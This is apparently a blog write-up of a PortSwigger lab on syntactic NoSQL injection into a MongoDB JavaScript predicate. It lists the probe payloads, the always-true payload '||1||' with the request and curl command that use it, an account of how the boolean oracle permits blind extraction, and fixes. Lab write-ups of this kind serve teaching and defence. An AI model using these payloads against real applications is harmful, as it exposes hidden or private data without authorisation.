---
layout: post
title: "PortSwigger: Detecting NoSQL Injection"
date: 2027-08-29 09:00:00 -0500
categories: [Web Security, NoSQL Injection]
tags: [portswigger, nosql, mongodb, injection, web]
---

## Lab Summary

**Lab:** Detecting NoSQL injection  
**Difficulty:** Apprentice  
**CWE:** CWE-943 – Improper Neutralization of Special Elements in a Data Query Logic  
**Result:** Solved

---

## The Vulnerability

The shop filters products by category. Behind the scenes the application builds a
MongoDB query by pasting the `category` value **straight into a piece of
server-side JavaScript** (a `$where`-style predicate). Because your text becomes
part of a live JavaScript string, you can break out of that string and inject
your own logic — the NoSQL cousin of classic SQL injection.

Most people associate NoSQL injection with *operator* injection (sending
`{"$ne": null}` as a JSON value). This is the other flavour: **syntactic**
injection into a JavaScript string, detected exactly like in-string SQLi — with a
quote and a boolean test.

---

## Detection and Exploitation

The vulnerable parameter is `category` on `GET /filter`. Every value below is sent
URL-encoded.

| `category` value          | Result            | Meaning |
|---------------------------|-------------------|---------|
| `Accessories`             | 200, 3 products   | baseline |
| `Accessories'`            | **HTTP 500**      | the quote closed the JS string early → invalid JavaScript → server error. We are inside a JS string. |
| `Accessories'+'`          | 200, 3 products   | `'+'` is string concatenation; it repairs the syntax, proving the value sits inside a JS string literal. **Injectable.** |
| `Accessories' && 0 && 'x` | 200, 0 products   | injected `&& 0` → false → no rows (boolean oracle: FALSE) |
| `Accessories' && 1 && 'x` | 200, 3 products   | `&& 1` → true → normal rows (boolean oracle: TRUE) |
| `Accessories'\|\|1\|\|'`  | 200, **20 products** | `\|\|1\|\|` forces the predicate always-true, bypassing the "released only" filter, returning every product including unreleased ones. **Solved.** |

The working exploit request:

```
GET /filter?category=Accessories%27%7c%7c1%7c%7c%27
```

Done with `curl`:

```bash
curl -sk -G "https://TARGET/filter" --data-urlencode "category=Accessories'||1||'"
```

The lab status widget flipped to **Solved** the moment the unreleased products
came back.

---

## Why It Works

The query predicate is built roughly like this:

```js
this.category === 'USER_INPUT' && this.released === true
```

- A single `'` ends the string mid-expression → broken JavaScript → HTTP 500. That
  500 versus the 200 baseline is the entire detection signal.
- `' && 1/0 && 'x` keeps the JavaScript valid while injecting a boolean — a 1-bit
  oracle you can use to blind-exfiltrate data character by character.
- `'||1||'` short-circuits the whole predicate to `true`, so
  `this.released === true` never filters anything and hidden rows leak.

---

## The Fix

- Never build a query by concatenating user input into a JavaScript expression.
  Avoid `$where` / `eval` / `mapReduce` with attacker-influenced strings.
- Use a structured query document and pass the category as a typed scalar:

  ```js
  db.collection('products').find({ category: String(req.query.category), released: true });
  ```

- Reject or escape JavaScript metacharacters (`'`, `&&`, `||`) in any field that
  reaches the query.
